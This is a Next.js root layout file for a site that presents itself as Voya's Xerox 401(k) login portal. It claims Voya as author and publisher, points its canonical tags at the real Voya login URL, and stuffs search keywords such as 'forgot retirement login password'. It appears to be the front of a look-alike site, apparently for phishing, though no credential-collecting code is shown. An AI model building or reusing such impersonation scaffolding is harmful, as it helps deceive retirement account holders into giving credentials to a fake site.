import type React from "react";
import type { Metadata, Viewport } from "next";
import { Geist } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import "./globals.css";

const geist = Geist({ subsets: ["latin"] });

const CANONICAL_LOGIN_URL =
  "https://login.voya.com/voyassoui/index.html?domain=xerox401k.voya.com#/login-pweb";
const SITE_DOMAIN = "login.voya.com";
const SITE_BRAND = "Voya";

export const metadata: Metadata = {
  metadataBase: new URL(
    process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
  ),
  title: {
    default: "Voya - 401(k) Login",
    template: "%s | Voya",
  },
  keywords: [
  "Xerox",
  "Xerox benefits",
  "Xerox employee benefits",
  "Xerox retirement plan",
  "Xerox retirement benefits",
  "Xerox 401(k)",
  "Xerox 401k",
  "Xerox 401(k) login",
  "Xerox 401k login",
  "Xerox retirement account",
  "Xerox account access",
  "Xerox participant portal",
  "Xerox employer portal",
  "Xerox secure login",
  "Xerox benefits portal",
  "Xerox retirement savings",
  "Xerox investment portfolio",
  "Xerox 401(k) contributions",
  "Xerox employee retirement",
  "Xerox retirement plan login",
  "xerox benefits login",
  "xerox retirement login",
  "xerox 401k account access",
  "xerox participant login",
  "xerox employer login",
  "Voya",
  "Voya retirement services",
  "voya.com",
  "Voya login",
  "Voya 401(k) login",
  "Voya retirement account access",
  "Voya participant portal",
  "Voya employer portal",
  "retirement plan",
  "employee retirement",
  "retirement savings",
  "retirement benefits",
  "investment portfolio",
  "401(k) login",
  "401k login",
  "401(k) account access",
  "retirement account login",
  "participant portal login",
  "employer portal login",
  "secure retirement login",
  "secure account access",
  "retirement plan participant login",
  "how to access 401k account online",
  "how to check retirement balance",
  "how to manage 401k contributions",
  "how to log into retirement account",
  "retirement account access help",
  "forgot retirement login password",
  "401k login issues",
  "secure retirement portal access",
  "participant portal authentication",
  "account recovery retirement portal"
],
  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your Xerox 401(k) retirement plan account, manage your investments, and sign in securely through Voya.`,

  authors: [{ name: "Voya" }],
  creator: "Voya",
  publisher: "Voya",
  applicationName: SITE_BRAND,
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    title: "Voya - 401(k) Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your Xerox 401(k) retirement plan account, manage your investments, and sign in securely through Voya.`,
    siteName: SITE_BRAND,
    url: CANONICAL_LOGIN_URL,
    images: [
      {
        url: "/favicon-32x32.png",
        width: 32,
        height: 32,
        alt: `${SITE_BRAND}`,
      },
    ],
  },
  twitter: {
    card: "summary",
    title: "Voya - 401(k) Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your Xerox 401(k) retirement plan account, manage your investments, and sign in securely through Voya.`,
    images: ["/favicon-32x32.png"],
  },
  icons: {
    icon: "/favicon-32x32.png",
    shortcut: "/favicon-32x32.png",
    apple: "/favicon-32x32.png",
  },
  category: "Business",
  alternates: {
    canonical: CANONICAL_LOGIN_URL,
    languages: {
      "en-US": CANONICAL_LOGIN_URL,
    },
  },
  other: {
    "geo.region": "US",
  },
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  themeColor: "#254650",
};

const jsonLd = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  name: SITE_BRAND,
  url: CANONICAL_LOGIN_URL,
  description:
    "Voya sign in portal. Login to manage your Xerox 401(k) retirement plan, view your investments, and access your Voya account.",
  publisher: {
    "@type": "Organization",
    name: "Voya",
  },
  inLanguage: "en-US",
  potentialAction: {
    "@type": "SearchAction",
    target: { "@type": "EntryPoint", url: CANONICAL_LOGIN_URL },
    "query-input": "required name=search_term_string",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en-US">
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body className={`${geist.className} font-sans antialiased`}>
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
        {children}
        <Analytics />
      </body>
    </html>
  );
}
